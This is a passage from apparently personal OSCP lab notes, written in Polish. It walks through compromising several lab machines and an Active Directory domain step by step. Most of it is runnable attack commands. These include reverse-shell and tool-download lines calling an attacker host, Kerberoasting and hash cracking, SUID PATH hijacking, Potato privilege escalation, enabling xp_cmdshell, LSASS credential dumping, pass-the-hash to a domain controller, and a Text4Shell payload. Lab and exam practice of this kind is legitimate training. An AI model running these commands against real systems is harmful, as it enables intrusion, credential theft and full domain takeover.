# MS01 jest dual-homed (ma też 10.10.224.141). Tunel:
chisel server -p 8080 --reverse                       # na Kali
# na MS01 (przez webshell): pobierz chisel.exe i odpal klienta:
#   certutil -urlcache -split -f http://<KALI>:8000/chisel.exe C:\Windows\Temp\ch.exe
#   C:\Windows\Temp\ch.exe client <KALI>:8080 R:socks
# -> SOCKS na 127.0.0.1:1080. Wszystko do AD: proxychains -q <narzędzie>
# w /etc/proxychains4.conf ma być: socks5 127.0.0.1 1080
```

## D.5 Enumeracja AD (assumed breach: Eric.Wallows)
```bash
# identyfikacja hostów wewnętrznych:
proxychains -q nxc smb 10.10.224.140 10.10.224.142 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam
#   .140 = DC01, .142 = MS02

# Kerberoasting. UWAGA: jeśli dostaniesz KRB_AP_ERR_SKEW (clock skew), zsynchronizuj zegar.
#   Na egzaminie: sudo ntpdate <DC>  (albo sudo rdate -n <DC>)
#   Jeśli sudo bez hasła niedostępne: użyj faketime z offsetem godzinowym:
faketime -f '+7h' proxychains -q impacket-GetUserSPNs -dc-ip 10.10.224.140 \
  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
#   -> web_svc : Diamond1   (sql_svc = patrz D.6)

# mapa domeny (BloodHound przez pivot):
proxychains -q bloodhound-python -u web_svc -p Diamond1 -d oscp.exam -ns 10.10.224.140 --dns-tcp -c All --zip
#   cel = tom_admin (Domain Admin)
```

## D.6 Stan i jak dokończyć (uczciwie)
- **Zrobione czysto:** `.143` (root, obie flagi), **MS01** (SYSTEM + pivot).
- **AD → DC (MS02→tom_admin→DC01):** brama to **MSSQL na MS02 przez konto `sql_svc`** (drugi kerberoast). Gdy złamiesz sql_svc:
  ```bash
  # MSSQL jako sql_svc (sysadmin) -> włącz i użyj xp_cmdshell:
  proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'<hasło>'@10.10.224.142 -windows-auth
  #   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  #   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  #   SQL> EXEC xp_cmdshell 'whoami';    -> shell na MS02 -> dump creds -> tom_admin -> DC01 proof.txt
  ```
  U mnie sql_svc nie złamał się (rockyou/best64/dive ani custom słownik z cewl+nazwiska). Na egzaminie to konto ZWYKLE łamie się rockyou — jeśli nie, buduj custom słownik: `cewl -d 3 -m 3 <każda strona> > words.txt`, potem `hashcat -m 13100 kerb.txt words.txt -r rules/best64.rule` oraz hybryda `-a 6 words.txt ?d?d?d`.
- **.144:** wystawiony `.git` w web-root → `git-dumper http://192.168.224.144/.git/ out` → w historii creds do bazy „staff" (`dean:BreakingBad92`) i podatny custom-API (`export.php` = zapis pliku). Uwaga: apka nie była u mnie wdrożona pod znaną ścieżką — dokończenie wymaga znalezienia deploymentu.
- **.145:** port 1978 = **RemoteMouse 3.008 RCE** → `msfconsole` → `use exploit/windows/misc/remote_mouse_rce` (jeden dozwolony strzał MSF na egzaminie). Wymaga aktywnej sesji pulpitu na celu.

---

# Appendix E — OSCP Challenge Lab B (walkthrough, styl kursowy)

> 6 maszyn: 3 standalone (`.149`,`.150`,`.151`) + 3 w AD `oscp.exam` (MS01 `.147`, DC01 `10.10.224.146`, MS02 `10.10.224.148`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>`=tun0. Wynik: **.149 root, .151 SYSTEM, AD → DC01 przejęte** (5/6). `.150` — patrz E.7.
>
> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** `local.txt`/`proof.txt` MUSISZ pokazać w **interaktywnym shellu** komendą `type`/`cat` z oryginalnej lokalizacji + screenshot z IP celu (`ip a`/`ipconfig`). **Zero punktów** za flagę pobraną: z webshella, przez `exploit.py --cmd`, przez `nxc/wmiexec/gp.exe -cmd '...type...'` jako jednorazówkę. Windows: shell jako SYSTEM/Administrator/admin. Linux: root shell. `evil-winrm`, `psexec`, `impacket-wmiexec` (prompt), `ssh`, reverse shell = **OK** (to interaktywne shelle). Webshell = **NIE**.

## E.1 Rozpoznanie
```bash
nmap -sV -p- --min-rate 2000 192.168.224.147   # MS01: 21,445,5985(WinRM),8000/8080/8443(web) -> AD entry
nmap -sV -p- --min-rate 2000 192.168.224.149   # 21(vsftpd),22,80 -> UWAGA sprawdz tez UDP!
nmap -sV -p- --min-rate 2000 192.168.224.150   # 22, 8080 (Spring/Tomcat)
nmap -sV -p- --min-rate 2000 192.168.224.151   # 80,3389,5060(FreeSWITCH),8081
```

## E.2 Standalone .149 — SNMP → SSH → SUID → root
```bash
# TCP nic nie dalo (web=default Apache, FTP anon off) -> skan UDP:
nmap -sU --top-ports 100 192.168.224.149        # 161/udp open snmp
onesixtyone 192.168.224.149 public              # community "public" dziala
snmpwalk -v2c -c public 192.168.224.149 1.3.6.1.4.1.8072.1.3.2   # NET-SNMP extend
#   -> skrypt "RESET_PASSWD" resetuje haslo usera kiero do domyslnego; userzy john, kiero
# domyslne haslo:
nxc ftp 192.168.224.149 -u kiero -p kiero       # [+] kiero:kiero
# FTP jako kiero -> prywatne klucze SSH:
ftp kiero:kiero -> get id_rsa (klucz usera john)
ssh -i id_rsa john@192.168.224.149              # INTERAKTYWNY shell jako john
#   w tym shellu:  cat /home/john/local.txt      <-- LOCAL.TXT (interaktywny shell, cat)
# privesc: SUID binarka RESET_PASSWD wola 'chpasswd' bez sciezki -> PATH hijack:
cd /tmp; printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > chpasswd
chmod +x chpasswd; export PATH=/tmp:$PATH; /home/john/RESET_PASSWD
/tmp/rootbash -p                                # INTERAKTYWNY root shell (NIE -c)
#   w root shellu:  cat /root/proof.txt          <-- PROOF.TXT (interaktywny root shell, cat)
```

## E.3 Standalone .151 — FreeSWITCH → SYSTEM
> ⚠️ **REGUŁA OSCP — flagi TYLKO z interaktywnego shella (`type`/`cat`), nigdy przez exploit `--cmd` ani webshell = 0 pkt.** RCE FreeSWITCH i GodPotato `-cmd` służą tylko do zdobycia dostępu; flagę czytasz dopiero z prawdziwego shella (reverse shell / evil-winrm).
```bash
# port 5060 = FreeSWITCH; mod_event_socket (port 8021, haslo domyslne "ClueCon") = RCE
searchsploit FreeSWITCH                          # 47799
# event-socket: polacz 8021, auth ClueCon, "api system <cmd>". RCE tylko do zdobycia INTERAKTYWNEGO shella:
# 1) listener: nc -lvnp 4151    2) odpal reverse shell przez RCE (PS -e <base64 payloadu do <KALI>:4151>):
python3 free.py 'powershell -e <BASE64_REVERSE_SHELL>'
# --- w interaktywnym shellu (jako oscp\chris): ---
#   whoami ; type C:\Users\chris\Desktop\local.txt        <-- LOCAL.TXT z interaktywnego shella
# privesc: chris ma SeImpersonate -> GodPotato daje interaktywny SYSTEM shell (nowy reverse shell):
#   certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
#   certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe   (listener: nc -lvnp 4152)
#   C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 4152 -e cmd.exe"
# --- w interaktywnym SYSTEM shellu: ---
#   whoami   (nt authority\system) ; type C:\Users\Administrator\Desktop\proof.txt   <-- PROOF.TXT
```

## E.4 AD — foothold MS01 + local privesc (SeImpersonate)
```bash
# assumed breach: Eric.Wallows ma WinRM na MS01 (jest w "Remote Management Users"):
nxc winrm 192.168.224.147 -u Eric.Wallows -p 'EricLikesRunning800'   # (Pwn3d!)
evil-winrm -i 192.168.224.147 -u Eric.Wallows -p 'EricLikesRunning800'
#   whoami /priv -> SeImpersonatePrivilege ; ipconfig -> dual-homed 10.10.224.147
# local privesc: SeImpersonate -> PrintSpoofer, dodaj Eric do lokalnych adminow:
iwr http://<KALI>:8000/PrintSpoofer64.exe -OutFile ps.exe
.\ps.exe -c "cmd /c net localgroup Administrators oscp\Eric.Wallows /add"
# teraz Eric = lokalny admin -> secretsdump (LSA autologon):
impacket-secretsdump 'oscp.exam/Eric.Wallows:EricLikesRunning800@192.168.224.147'
#   -> DefaultPassword (autologon): celia.almeda : 7k8XHk3dMtmpnC7
```

## E.5 AD — pivot + Kerberoasting
```bash
# postaw pivot chisel przez MS01 (Eric admin -> scheduled task jako SYSTEM zeby persystentnie):
#   Kali: chisel server -p 8080 --reverse
#   MS01: schtasks /create /tn p /tr "C:\...\ch.exe client <KALI>:8080 R:socks" /sc onstart /ru SYSTEM /f; schtasks /run /tn p
# internal: DC01=10.10.224.146, MS02=10.10.224.148
proxychains -q nxc smb 10.10.224.146 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam
# Kerberoast (uwaga clock skew -> faketime):
faketime -f '+7h' proxychains -q impacket-GetUserSPNs -dc-ip 10.10.224.146 \
  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
#   -> web_svc:Diamond1 ; sql_svc:Dolphin1
```

## E.6 AD — SQL Server (MS02) → SYSTEM → Domain Admin → DC01
```bash
# sql_svc jest sysadmin na MSSQL (MS02). Wlacz xp_cmdshell:
faketime -f '+7h' proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'Dolphin1'@10.10.224.148 -windows-auth
#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
#   SQL> EXEC xp_cmdshell 'whoami';   -> nt service\mssql$sqlexpress (ma SeImpersonate)
# MS02 nie siega Kali -> hostuj GodPotato na MS01 (Everyone-READ share) i pobierz z niego:
#   MS01(Eric admin): mkdir C:\tools; copy gp.exe C:\tools; net share tools=C:\tools /grant:Everyone,READ
#   MSSQL> EXEC xp_cmdshell 'copy \\10.10.224.147\tools\gp.exe C:\Windows\Temp\gp.exe'
#   MSSQL> EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c net localgroup Administrators oscp\Eric.Wallows /add"'
# Eric admin na MS02 -> wyciagnij DA z pamieci (LSASS/Mimikatz):
proxychains -q nxc smb 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam -M lsassy
#   -> OSCP\Administrator NTLM 59b280ba707d22e3ef0aa587fc29ffe5 (DA w pamieci!)
# Pass-the-Hash na DC01 -> INTERAKTYWNY shell (wmiexec/psexec/evil-winrm = OK wg reguł, to NIE webshell):
proxychains -q impacket-wmiexec -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146
#   --- w tym interaktywnym shellu (jako oscp\administrator): ---
#   whoami ; type C:\Users\Administrator\Desktop\proof.txt   <-- PROOF.TXT (interaktywny shell, type)
proxychains -q impacket-secretsdump -just-dc -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146  # krbtgt itd. (do raportu)
```

## E.7 .150 (Spring/Tomcat) — Text4Shell (do dokończenia)
```bash
# app REST: GET /search?query=  -> podatne na interpolacje ${...} (Apache Commons Text, CVE-2022-42889)
# potwierdzone: url: lookup dziala (blind SSRF):
curl -G http://192.168.224.150:8080/search --data-urlencode 'query=${url:UTF-8:http://<KALI>:8000/x}'   # -> callback na twoj serwer
```
> STATUS: potwierdzony blind SSRF przez `${url:...}` (interpolacja w sinku logowania — output niewidoczny). `${script:javascript:...}` (RCE) oraz `${file:}`/`${sys:}` NIE rozwiązują się (ograniczony zestaw lookupów), więc bezpośrednie RCE tym payloadem nie wyszło. Następny krok: wersja Commons Text z działającym `script:` daje RCE `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`; albo użyć SSRF do wewnętrznej usługi. NIEUKOŃCZONE.
